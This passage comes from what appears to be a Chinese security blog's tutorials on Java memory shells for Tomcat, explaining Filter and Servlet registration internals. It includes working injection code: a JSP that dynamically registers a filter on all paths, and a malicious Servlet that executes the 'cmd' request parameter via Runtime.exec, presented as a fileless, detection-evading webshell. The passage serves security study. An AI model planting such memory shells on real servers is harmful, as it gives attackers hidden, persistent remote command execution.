ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);\n    filterConfigs.put(filterName, filterConfig);\n\n    out.print(\"FilterMeInject Success !\");\n  }\n%>\n\n```\n\n访问filtershell.jsp后成功加入filter过滤器，随便发送请求并传入cmd参数进行RCE就可以了\n\n## 0x05POC代码分析\n\n为什么要写这个呢？主要是感觉前面的代码分析有点不清不楚的，想重新看一下\n\n首先前面的获取StandardContext就不说了，这个之前就讲过\n\n然后就是这段\n\n```java\n// 获取filterConfigs\n  Field filterConfigField = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n  filterConfigField.setAccessible(true);\n  Map filterConfigs = (Map) filterConfigField.get(standardContext);\n```\n\n为什么需要获取filterConfigs呢？\n\n在org.apache.catalina.core.StandardContext#filterStart()方法中\n\n![image-20250822182928139](../image/achieve/202411/java学习/image-20250822182928139.png)\n\n可以看到在init初始化filter的时候会将filterconfig放入filterConfigs中，而我们获取这个filterConfigs就是为了在后面添加我们动态注册的filterConfig\n\n然后我们看这段代码\n\n```java\n    //FilterDef\n    FilterDef filterDef = new FilterDef();\n    filterDef.setFilter(filter);\n    filterDef.setFilterName(filterName);\n    filterDef.setFilterClass(filter.getClass().getName());\n    standardContext.addFilterDef(filterDef);\n```\n\n这里的话是获取一个FilterDef，为什么需要设置这些值呢\n\n首先初始化过程在org.apache.catalina.core.ApplicationFilterConfig#ApplicationFilterConfig()方法中\n\n![image-20250822183303835](../image/achieve/202411/java学习/image-20250822183303835.png)\n\n这里的话是传入了一个filterDef，从图中可以看出里面有Filter、FilterName、FilterClass这些属性的值，所以也是我们需要设置的属性内容\n\n接着再看这段代码\n\n```java\n    // FilterMap\n    FilterMap filterMap = new FilterMap();\n    filterMap.addURLPattern(\"/*\");\n    filterMap.setFilterName(filterName);\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n    standardContext.addFilterMapBefore(filterMap);\n```\n\n首先就是在org.apache.catalina.core.ApplicationFilterFactory#createFilterChain()方法中\n\n![image-20250822183832555](../image/achieve/202411/java学习/image-20250822183832555.png)\n\n这里的话会调用一个findFilterMaps去拿到FilterMap的值\n\n![image-20250822183804462](../image/achieve/202411/java学习/image-20250822183804462.png)\n\n可以看到这里的话就是需要传入一个filterName、urlPatterns，然后额外设置一个DispatcherType去指定请求的处理方式\n\n最后的话就是实例化一个filterConfig对象，并将filterConfig对象放入服务器的filterConfigs当中，也就是用put方法\n\n到此分析就算彻底结束了~下播下播\n","tags":["java内存马"],"categories":["javasec"]},{"title":"Java内存马之Servlet型内存马","url":"/2025/08/19/Java内存马之Servlet型内存马/","content":"\n## 01 扯点没用的\n\n前面学了一阵子Java，但始终没有接触到Javasec里面一个很核心的内容——内存马，如果要给Webshell分个等级的话，JavaWeb内存马一定是最值得深究且作用最广泛的。\n\n其实本应该在上上个周就开始学习这部分的内容的，但是一直断断续续的有惰性加上周末打了一个比赛，后面在跟bao师傅唠嗑的时候聊到了后面就业方向的问题，毋庸置疑的是，Java仍然是现阶段国内最热门的语言，Java的代码审计也是我认为相对来说可见性比较高的方向。后面我想着需要练习一下代码审计的能力，就想着先去审一下框架源码，但是头几天没找到一个可行的方向，现在索性就先学Java内存马，然后再从里面挖掘源码一步步来了\n\n参考文章：\n\nhttps://nosec.org/home/detail/5049.html\n\nhttps://xz.aliyun.com/news/18301\n\nhttps://github.com/W01fh4cker/LearnJavaMemshellFromZero\n\nhttps://xz.aliyun.com/news/13078\n\nhttps://su18.org/post/memory-shell/\n\n## 02 关于内存马\n\n### 什么是内存马？\n\n其实内存马的话之前在学python内存马的时候也了解过不少了，但这里还是想扯皮一下\n\n在传统的Webshell的使用与不断迭代的防御机制的斗争中，无论我们如何花费心思去隐藏，如何变幻，都无法在目标系统长时间的保留。\n\n目前主流的防御措施针对 Webshell 的静态检出率在 90% 以上，在部分环境下甚至完全无法落地，防御方可以做到快速应急响应。正因为这些限制，内存马技术得以诞生并快速发展，无文件攻击、内存 Webshell、进程注入等基于内存的攻击手段也受到了越来越多的师傅青睐，那什么是内存马呢？\n\n内存马（Memory Shellcode）是一种恶意攻击技术，旨在通过利用程序或操作系统的漏洞，将恶意代码注入到系统内存中运行。与传统的攻击方式不同，内存马不需要将恶意代码写入磁盘上的文件，而是直接在内存中进行操作，从而避开传统的安全防护措施。\n\n### 内存马的分类\n\n根据内存马的实现技术，`su18`师傅对内存马进行了大致的分类\n\n![内存马分类图2副本.png](../image/achieve/202411/java学习/内存马分类图2副本.png)\n\n其实大致的话是可以分为以下几大类：\n\n- 传统`web`型内存马（Filter、servlet、Listener动态注册）\n- Spring框架型内存马\n- 中间件型内存马\n- 其他内存马（Websocket/Tomcat Jsp/线程型/RMI）\n- Agent型内存马\n\n### 内存马的用处\n\n内存马的用因主要在于以下几个方面\n\n- **由于网络原因不能反弹 shell 的；**\n- **内部主机通过反向代理暴露 Web 端口的；**\n- **服务器上有防篡改、目录监控等防御措施，禁止文件写入的；**\n- **服务器上有其他监控手段，写马后会告警监控，人工响应的；**\n- **服务使用 Springboot 等框架，无法解析传统 Webshell 的；**\n- **对内存马技术感到不明觉厉的....**\n\n但是从以上的介绍也可以发现，内存马的使用是转瞬即逝的，也就是说，只要服务重启后就会失效，不过通常情况下服务频繁重启的可能性是不大的，再加上内存马的隐蔽性，使得内存马依旧成为攻击者首选的Webshell维持方式\n\n关于内存马的注入方式，会在后面的内容中逐一添加，并且会在最后的时候进行一定的自我总结\n\n简单的介绍完了，就开始正式学习吧\n\n## 03.1 前置知识\n\n环境：jdk1.8.0_321 + Tomcat9.0.108\n\ntomcat下载链接：https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.108/bin/apache-tomcat-9.0.108-windows-x64.zip\n\n下载后在/bin目录下找到startup.bat运行然后访问8080端口就可以了\n\n![image-20250819152457911](../image/achieve/202411/java学习/image-20250819152457911.png)\n\n### Tomcat中Servlet容器\n\n翻到一个对Servlet解释比较好的文章：https://juejin.cn/post/6994810991997354014\n\n- 什么是Servlet？\n\n参考文章：https://blog.csdn.net/caqjeryy/article/details/122095308\n\nServlet是Java Servlet的简称，是使用Java语言编写的运行在服务器端的程序。它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。\n\n请求处理过程：\n\n- Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。\n- Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。\n- Servlet容器调用service()方法。\n- service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法。\n- 容器关闭时候，会调用destory方法\n\n什么是Tomcat？\n\nTomcat是一种Web应用服务器，同时也是Servlet容器，简单来说Tomcat就是servlet的运行环境，servlet必须运行在像Tomcat这种servlet容器上\n\nTomcat 设计了 4 种容器，分别是 Engine、Host、Context 和 Wrapper。文章的师傅对这四个容器的概念进行了一个图形化的解释\n\n![img](../image/achieve/202411/java学习/40d47f560bd743e5ac41a571d0be3dc9tplv-k3u1fbpfcp-zoom-in-crop-mark1512000.webp)\n\n这 4 种容器不是相互独立的关系，而是父子关系，逐层包含。也正是因为这种分层架构设计，使得Servlet容器具有良好的兼容性和灵活性\n\n一个Service最多只能有一个Engine，Engine表示引擎，用来管理多个虚拟主机的。Host代表就是一个虚拟主机，可以给Tomcat配置多个虚拟主机，一个虚拟主机下面可以部署多个Web应用。一个Context就表示一个Web应用，Web应用中会有多个Servlet，Wrapper就表示一个Servlet。\n\n在Tomcat的server.xml配置文件中，就体现了这样的设计\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- 简化版 Tomcat server.xml 核心配置 -->\n\n<Server port=\"8005\" shutdown=\"SHUTDOWN\">\n    \n  <!-- 顶层组件，可以包含一个Engine，多个连接器 -->\n  <Service name=\"Catalina\">\n\n    <!-- HTTP 连接器：接收客户端请求 -->\n    <Connector port=\"8080\" protocol=\"HTTP/1.1\"\n               connectionTimeout=\"20000\"\n               redirectPort=\"8443\"\n               maxParameterCount=\"1000\" />\n\n    <!-- 引擎容器：请求分发核心 -->\n    <Engine name=\"Catalina\" defaultHost=\"localhost\">\n\n      <!-- Realm：用户认证 -->\n      <Realm className=\"org.apache.catalina.realm.LockOutRealm\">\n        <Realm className=\"org.apache.catalina.realm.UserDatabaseRealm\"\n               resourceName=\"UserDatabase\"/>\n      </Realm>\n\n      <!-- Host：虚拟主机 -->\n      <Host name=\"localhost\" appBase=\"webapps\"\n            unpackWARs=\"true\" autoDeploy=\"true\">\n\n        <!-- 访问日志记录 -->\n        <Valve className=\"org.apache.catalina.valves.AccessLogValve\"\n               directory=\"logs\"\n               prefix=\"localhost_access_log\"\n               suffix=\".txt\"\n               pattern=\"%h %l %u %t &quot;%r&quot; %s %b\" />\n\n      </Host>\n    </Engine>\n  </Service>\n</Server>\n```\n\n既然Tomcat设计了那么多个容器，在那么多个容器组合使用的时候，设想这样一个场景：我们此时要访问https://manage.xxx.com:8080/user/list，那`tomcat`是怎么确定请求到达的是那个Wrapper容器中的Servlet来处理的？为此`tomcat`设计了`Mapper`，其中保存了**容器组件与访问路径的映射关系**。\n\n![img](../image/achieve/202411/java学习/20240112165824.png)\n\n当我们发送请求时，一共会经过四个步骤\n\n1. 根据协议和端口号选定`Service`和`Engine`。\n\n   我们知道`Tomcat`的每个连接器都监听不同的端口，比如`Tomcat`默认的`HTTP`连接器监听`8080`端口、默认的`AJP`连接器监听`8009`端口。上面例子中的URL访问的是`8080`端口，因此这个请求会被`HTTP`连接器接收，而一个连接器是属于一个`Service`组件的，这样`Service`组件就确定了。我们还知道一个`Service`组件里除了有多个连接器，还有一个容器组件，具体来说就是一个`Engine`容器，因此`Service`确定了也就意味着`Engine`也确定了。\n\n2. 根据域名选定`Host`。\n\n   `Service`和`Engine`确定后，`Mapper`组件通过`url`中的域名去查找相应的`Host`容器，比如例子中的`url`访问的域名是`manage.xxx.com`，因此`Mapper`会找到`Host1`这个容器。\n\n3. 根据`url`路径找到`Context`组件。\n\n   `Host`确定以后，`Mapper`根据`url`的路径来匹配相应的`Web`应用的路径，比如例子中访问的是`/user`，因此找到了`Context1`这个`Context`容器。\n\n4. 根据`url`路径找到`Wrapper`（`Servlet`）。\n\n   `Context`确定后，`Mapper`再根据`web.xml`中配置的`Servlet`映射路径来找到具体的`Wrapper`和`Servlet`，例如这里的`Wrapper1`的`/list`。\n\n### 编写一个Servlet实操\n\n新建一个maven项目\n\n![image-20250820172334266](../image/achieve/202411/java学习/image-20250820172334266.png)\n\n创建好后目录是这样的\n\n![image-20250820174043171](../image/achieve/202411/java学习/image-20250820174043171.png)\n\n导入servlet-api依赖，修改pom.xml配置如下\n\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n  <modelVersion>4.0.0</modelVersion>\n  <groupId>org.example</groupId>\n  <artifactId>TestServlet</artifactId>\n  <packaging>war</packaging>\n  <version>1.0-SNAPSHOT</version>\n  <name>TestServlet Maven Webapp</name>\n  <url>http://maven.apache.org</url>\n  <dependencies>\n    <dependency>\n      <groupId>junit</groupId>\n      <artifactId>junit</artifactId>\n      <version>3.8.1</version>\n      <scope>test</scope>\n    </dependency>\n    <dependency>\n      <groupId>javax.servlet</groupId>\n      <artifactId>javax.servlet-api</artifactId>\n      <version>4.0.1</version>\n      <scope>provided</scope>\n    </dependency>\n  </dependencies>\n  <build>\n    <finalName>TestServlet</finalName>\n  </build>\n</project>\n\n```\n\n然后写一个测试servlet的代码TestServlet.java\n\n```java\npackage org.example;\n\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\n\npublic class TestServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        resp.getWriter().write(\"Hello World\");\n    }\n}\n```\n\n解释一下代码\n\n- `@WebServlet(\"/test\")` 👉 表示这个 Servlet 访问路径是 **`http://服务器地址:端口/项目名/test`**。\n- `extends HttpServlet` 👉 继承自 `HttpServlet`，必须重写 `doGet` / `doPost` 等方法才能处理请求。\n- `doGet` 👉 当浏览器发起 **GET 请求**（比如直接访问 URL）时，会执行这个方法。\n- `HttpServletRequest req` 👉 封装了请求的内容，比如 `req.getParameter(\"name\")` 可以获取 URL 参数。\n- `HttpServletResponse resp` 👉 用于向客户端返回数据。\n- `resp.getWriter().write(\"Hello World\");` 👉 向响应体里写入 `\"Hello World\"`。浏览器最终看到的就是这段文本。\n\n然后我们配置一下tomcat环境，先添加一个运行配置\n\n![image-20250820174132969](../image/achieve/202411/java学习/image-20250820174132969.png)\n\n然后点击右下角的修复去添加工件\n\n![image-20250820174229022](../image/achieve/202411/java学习/image-20250820174229022.png)\n\n添加后部署到tomcat服务器中，然后我们设置一下web模块和我们刚刚的工件绑定到一起\n\n随后我们配置一下web.xml\n\n```xml\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n\n  <servlet>\n    <servlet-name>TestServlet</servlet-name>\n    <servlet-class>org.example.TestServlet</servlet-class>\n  </servlet>\n  <servlet-mapping>\n    <servlet-name>TestServlet</servlet-name>\n    <url-pattern>/test</url-pattern>\n  </servlet-mapping>\n</web-app>\n```\n\n配置好后我们运行并访问/testServlet/test\n\n![image-20250819170710361](../image/achieve/202411/java学习/image-20250819170710361.png)\n\n### 从代码层面看Servlet的生命周期\n\n在Servlet规范中，servlet的生命周期包括初始化阶段、运行阶段、销毁阶段\n\nServlet 生命周期中 init 和 destroy 方法只会在 Servlet 实例创建和销毁时被调用一次，而 service 方法则会在每个请求到达时被调用一次。\n\n找到一个比较规范的图\n\n![img](../image/achieve/202411/java学习/8c038541f0fac542addcd5af51d43271.png)\n\n参考文章：https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/\n\n实际上在Tomcat7之后的版本，StandardContext中就提供了动态注册Servlet的方法，但是并没有实现\n\n![image-20250819171716013](../image/achieve/202411/java学习/image-20250819171716013.png)\n\n所以我们需要自己去实现动态添加servlet的功能，但是我们先来了解一下servlet的生命周期\n\n我们这里不采用我们下载的`tomcat`来运行我们的项目，我们使用嵌入式`tomcat`也就是所谓的`tomcat-embed-core`。\n\n我们把刚刚的pom.xml改一下\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>org.example</groupId>\n    <artifactId>ServletMemoryShell</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    </properties>\n    <dependencies>\n        <dependency>\n            <groupId>org.apache.tomcat.embed</groupId>\n            <artifactId>tomcat-embed-core</artifactId>\n            <version>9.0.108</version>\n            <scope>compile</scope>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.tomcat.embed</groupId>\n            <artifactId>tomcat-embed-jasper</artifactId>\n            <version>9.0.108</version>\n            <scope>compile</scope>\n        </dependency>\n    </dependencies>\n\n</project>\n```\n\n然后准备两个java文件\n\n一个用来启动Tomcat服务器，但是版本不一样的源码也不一样，具体参考https://blog.csdn.net/qq_42944840/article/details/116349603\n\nMain.java\n\n```java\npackage org.example;\n\nimport org.apache.catalina.Context;\nimport org.apache.catalina.LifecycleException;\nimport org.apache.catalina.startup.Tomcat;\nimport java.io.File;\n\npublic class Main {\n    public static void main(String[] args) throws LifecycleException {\n        Tomcat tomcat = new Tomcat();\n        tomcat.getConnector();  //Tomcat9.0以上需要加入这个代码\n        Context context = tomcat.addWebapp(\"\", new File(\"\").getAbsolutePath());\n        Tomcat.addServlet(context, \"TestServlet\", new TestServlet());\n        context.addServletMappingDecoded(\"/test\", \"TestServlet\");\n        tomcat.start();\n        tomcat.getServer().await();\n    }\n}\n\n```\n\nTestServlet.java\n\n```java\npackage org.example;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\n//@WebServlet(\"/test\")//这是一个 **Servlet 注解**，告诉容器当访问 `/test` 路径时，应该使用 `TestServlet` 类来处理请求。相当于在 `web.xml` 中配置了一个 URL 映射。\n\npublic class TestServlet extends HttpServlet {//提供了默认的处理方式，你只需要重写 `doGet()`、`doPost()` 等方法来处理不同的请求。\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/html\");\t//设置响应内容的类型为\"text/html\"，表示响应内容是 HTML 格式的文本。\n        PrintWriter out = response.getWriter();\t//获取响应的输出流 PrintWriter，用于将数据写入到响应体。\n        out.println(\"<html><body>\");//向客户端响应输出 HTML 开始标签\n        out.println(\"Hello, World!\");\n        out.println(\"</body></html>\");\n    }\n}\n```\n\n访问http://localhost:8080/test就能看到输出了\n\n#### Servlet初始化流程分析\n\n首先在`org.apache.catalina.core.StandardWrapper#setServletClass()`处下断点调试\n\n![image-20250819180233761](../image/achieve/202411/java学习/image-20250819180233761.png)\n\n追踪一下这个函数的上层调用位，但是一开始找不到，maven连接一直超时，jar包都下不来\n\n不行啊实在太麻烦了，给一个个找的话太复杂了换个版本\n\nTomcat 9.0.83\n\n上层调用位置位于`org.apache.catalina.startup.ContextConfig#configureContext`\n\n![image-20250819182631356](../image/achieve/202411/java学习/image-20250819182631356.png)\n\n不难看到这个函数其实就是接收我们的web.xml文件内容并进行处理的函数，然后我们分析一下这段代码都干了什么\n\n![image-20250820101935909](../image/achieve/202411/java学习/image-20250820101935909.png)\n\nfor循环开始先是利用webxml.getServlet()获取到所有的Servlet定义，然后createWrapper去创建一个Wrapper对象，之后利用setter和getter的方式去设置wrapper中servlet相关的属性，这里的话一个关键的属性就是load-on-startup属性，他会告诉tomcat是否在启动时立即加载并初始化该 Servlet。另外会获取到servlet的名称等等这些基础属性\n\n![image-20250820103355867](../image/achieve/202411/java学习/image-20250820103355867.png)\n\n继续获取到servlet的完全限定类名，之后初始化这些参数添加到wrapper中，这些参数在初始化的时候会传递给servlet的init()初始化方法\n\n最后通过`context.addChild(wrapper);`将配置好的`Wrapper`添加到`Context`中，完成`Servlet`的初始化过程。\n\n上面大的`for`循环中嵌套的最后一个`for`循环则负责处理`Servlet`的`url`映射，调用`StandardContext.addServletMappingDecoded()`添加servlet对应的映射，将`Servlet`的`url`与`Servlet`名称关联起来。\n\n总的来说，Servlet的初始化主要经过了以下\n\n-  `Wrapper wrapper = context.createWrapper();` 创建 Wapper 对象\n- `wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());` 设置的LoadOnStartUp 的值\n- `wrapper.setName(servlet.getServletName());`设置 Servlet 的 Name\n- `wrapper.setServletClass(servlet.getServletClass());`设置 Servlet 对应的 Class全限定类名\n- `context.addChild(wrapper);`将 Servlet 添加到 context 的 children 中\n- `context.addServletMappingDecoded(entry.getKey(), entry.getValue());`将 url 路径和 servlet 类做映射\n\n#### Servlet装载流程分析\n\n在`org.apache.catalina.core.StandardWrapper#loadServlet`这里打下断点进行调试，重点关注`org.apache.catalina.core.StandardContext#startInternal`\n\n![image-20250820104157412](../image/achieve/202411/java学习/image-20250820104157412.png)\n\n可以看到是在加载完Listener和Filter之后，才装载Servlet\n\n![image-20250820104442636](../image/achieve/202411/java学习/image-20250820104442636.png)\n\n所以在servlet容器启动之后会依次处理Listener->Filer->Servlet\n\n在最后的if中调用了一个loadOnstartup()方法，并调用findChildren()从StandardContext中拿到所有的child传入该方法中，我们跟进这个方法看看\n\n![image-20250820105331376](../image/achieve/202411/java学习/image-20250820105331376.png)\n\n根据注释的话其实也很明白了，可以看到，这段代码先是创建一个`TreeMap`，然后遍历传入的`Container`数组，将每个`Servlet`的`loadOnStartup`值作为键，将对应的`Wrapper`对象存储在相应的列表中；如果这个`loadOnStartup`值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个`loadOnStartup`的升序的顺序来加载。\n\n![image-20250820105339928](../image/achieve/202411/java学习/image-20250820105339928.png)\n\n然后就是遍历Servlet数组并调用load()去加载了\n\n其实从这里的话我们可以更进一步的了解到load-on-startup属性的作用，其实简单来说就是定义是否在服务器启动的时候就加载这个servlet，并且这个属性的内容需要是一个整数，这样的话就可以明确servlet被加载的前后顺序，其实tomcat就相当于采用一种懒加载的机制，当该属性没被设置时，只有发送请求（servlet被调用的时候才会加载到context中）。\n\n回到我们最初的目的，既然我们需要动态注册servlet，然后可以联想到python内存马中的一个after_request和before_request钩子函数的使用，那么这里就同样需要设置一个load-on-startup属性\n\n### 关于context的获取（漏掉啦）\n\n但是上面漏了讲一个点，就是关于context的获取，我们用传统的Tomcat去调试来看一下\n\n修改pom.xml如下\n\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n  <modelVersion>4.0.0</modelVersion>\n  <groupId>org.example</groupId>\n  <artifactId>TestServlet</artifactId>\n  <packaging>war</packaging>\n  <version>1.0-SNAPSHOT</version>\n  <name>TestServlet Maven Webapp</name>\n  <url>http://maven.apache.org</url>\n  <dependencies>\n    <dependency>\n      <groupId>junit</groupId>\n      <artifactId>junit</artifactId>\n      <version>3.8.1</version>\n      <scope>test</scope>\n    </dependency>\n    <dependency>\n      <groupId>javax.servlet</groupId>\n      <artifactId>javax.servlet-api</artifactId>\n      <version>4.0.1</version>\n      <scope>provided</scope>\n    </dependency>\n    <dependency>\n      <groupId>org.apache.tomcat</groupId>\n      <artifactId>tomcat-catalina</artifactId>\n      <version>9.0.108</version>\n    </dependency>\n  </dependencies>\n  <build>\n    <finalName>TestServlet</finalName>\n  </build>\n</project>\n\n```\n\n记得下载一下源代码，不然不好找\n\n在org.apache.catalina.startup.ContextConfig#configureContext()中\n\n![image-20250820183336572](../image/achieve/202411/java学习/image-20250820183336572.png)\n\n在底下可以看到，这里的话通过传入的webxml分析拿到的servlets和servletMapping\n\n我们在刚刚的for循环那里打个断点\n\n![image-20250820183624102](../image/achieve/202411/java学习/image-20250820183624102.png)\n\n这里的话会遍历所有的servlets的值，然后createWrapper()创建一个wrapper对象，我们走一遍循环看一下\n\n例如第一个servlet是default\n\n![image-20250820184226972](../image/achieve/202411/java学习/image-20250820184226972.png)\n\n经过setName后会在wrapper对象中设置一个name属性为default\n\n![image-20250820184325416](../image/achieve/202411/java学习/image-20250820184325416.png)\n\n经过setServletClass后会设置一个servletClass属性的值为org.apache.catalina.servlets.DefaultServlet\n\n最后通过addChild将该对象添加到context中\n\n然后我们来看一下如何将url 路径和 servlet 类做映射的\n\n![image-20250820184805495](../image/achieve/202411/java学习/image-20250820184805495.png)\n\n这里的话会遍历webxml中ServletMapping的键值\n\n![image-20250820184847763](../image/achieve/202411/java学习/image-20250820184847763.png)\n\n参照地下的数组和上面的entry的值可以知道，key就是`*.jspx`，而value就是`jsp`，之后会分别getKey获取key和getValue获取值并传到addServletMappingDecoded方法中调用并返回给context\n\n到这就是大致的思路，然后就是关于context的来源了\n\n![image-20250820185051568](../image/achieve/202411/java学习/image-20250820185051568.png)\n\n从this.context中可以看到这个context实际上就是StandardContext，那我们如何获取到StandardContext呢？\n\n```java\nHttpServletRequest.getServletContext.context.context\n```\n\n我们可以先调试一下，在TestServlet中的doGet方法打个断点\n\n![image-20250820185241826](../image/achieve/202411/java学习/image-20250820185241826.png)\n\n点击debug后弹出网页，我们访问TestServlet类映射的路由/test\n\n![image-20250820185437014](../image/achieve/202411/java学习/image-20250820185437014.png)\n\n然后我们调用req.getServletContext()，回车在结果中看到一个context\n\n![image-20250820185744882](../image/achieve/202411/java学习/image-20250820185744882.png)\n\n这里可以看到有一个ApplicationContext，展开这个context后在里面找到一个context\n\n![image-20250820185923979](../image/achieve/202411/java学习/image-20250820185923979.png)\n\n很惊喜的发现这个context的值就是刚刚我们调试的时候的context值，所以这个context就是我们需要获取到的context值\n\n基于这些原理，我们就可以写出一个内存马的具体实现\n\n## 03.2 Servlet内存马实现\n\n### 什么是Servlet内存马？\n\nServlet内存马是通过动态注册servlet来实现的一种内存攻击手段。在Java Web应用中，Servlet作为处理客户端请求的核心组件之一，能够直接处理http请求并返回响应。攻击者利用该特点，通过程序化地向Web容器例如Tomcat在运行时注册恶意的Servlet对象，使得该servlet能够在没用实际文件存在的情况下执行恶意程序。\n\nhttps://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90\n\n### Servlet内存马的条件和注入方式1\n\n从 Servlet 3.0 规范开始 (对应 Tomcat 7.0 及以上版本)，Java Web 才正式支持通过 ServletContext 对象**动态地**、**以编程方式**注册新的 Servlet、Filter 和 Listener。\n\n从上面的分析来看，实现内存马的步骤主要就是以下几个部分：\n\n1. 找到`StandardContext`\n2. 继承并编写一个恶意`servlet`\n3. 创建`Wapper`对象\n4. 设置`Servlet`的`LoadOnStartUp`的值\n5. 设置`Servlet`的`Name`\n6. 设置`Servlet`对应的`Class`\n7. 将`Servlet`添加到`context`的`children`中\n8. 将`url`路径和`servlet`类做映射\n\n### 内存马POC编写\n\n由浅入深我们先熟悉一下动态注册Servlet的过程\n\n例如我们尝试写了一个恶意的jsp文件\n\n第一步就是获取到StandardContext，这一步我们可以通过反射去实现\n\n```jsp\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<%\n    //反射获取StandardContext\n    ServletContext servletContext = request.getServletContext();\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n%>\n```\n\n不过这里的话还有一种可以获取到StandardContext的方法\n\n同样的，在doGet打个断点然后访问/test\n\n![image-20250821105256731](../image/achieve/202411/java学习/image-20250821105256731.png)\n\n在底下可以看到一个request字段表示一个Request对象，然后我们传入`((RequestFacade) req).request.getContext()`表达式\n\n![image-20250821105527551](../image/achieve/202411/java学习/image-20250821105527551.png)\n\n成功找到这个context，由此可得\n\n```java\n\t// 更简单的方法 获取StandardContext\n    Field reqF = request.getClass().getDeclaredField(\"request\");\n    reqF.setAccessible(true);\n    Request req = (Request) reqF.get(request);\n    StandardContext standardContext = (StandardContext) req.getContext();\n```\n\n第二步就是编写一个恶意`servlet`\n\n```java\n    class S implements Servlet{\n        @Override\n        public void init(ServletConfig config) throws ServletException {\n\n        }\n        @Override\n        public ServletConfig getServletConfig(){\n            return null;\n        }\n\n        @Override\n        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {\n            String cmd = req.getParameter(\"cmd\");\n            if(cmd != null){\n                try {\n                    Runtime.getRuntime().exec(cmd);\n                } catch (IOException e){\n                    e.printStackTrace();\n                }\n            }\n        }\n        \n        @Override\n        public void destroy(){\n            \n        }\n        @Override\n        public String getServletInfo(){\n            return null;\n        }\n    }\n```\n\n这时候就有人要问了，哎？为啥要写那几个额外的方法\n\n我们跟进Servlet接口看看\n\n![image-20250821112608735](../image/achieve/202411/java学习/image-20250821112608735.png)\n\n可以看到这里这个接口需要实现这些方法的具体实现，而类实现接口的话就必须要实现接口所有方法（除非的抽象类），那这几个方法的作用和原理分别是什么呢？\n\n| 方法                                               | 作用                                                         |\n| -------------------------------------------------- | ------------------------------------------------------------ |\n| `init(ServletConfig config)`                       | **初始化方法**。在 Servlet 第一次被加载时调用，用来做初始化工作，比如读取配置参数、建立数据库连接等。 |\n| `getServletConfig()`                               | 返回 Servlet 的配置信息（`ServletConfig` 对象），通常在 `init` 中保存该对象，方便后续使用。 |\n| `service(ServletRequest req, ServletResponse res)` | **核心方法**。处理每一个客户端请求。Servlet 容器每次接收到请求都会调用它。通常会在这里根据请求类型调用 `doGet`、`doPost` 等方法。 |\n| `getServletInfo()`                                 | 返回 Servlet 的一些描述信息（比如版本、作者等），通常用于管理工具或文档，不是必须业务逻辑。 |\n| `destroy()`                                        | 在 Servlet 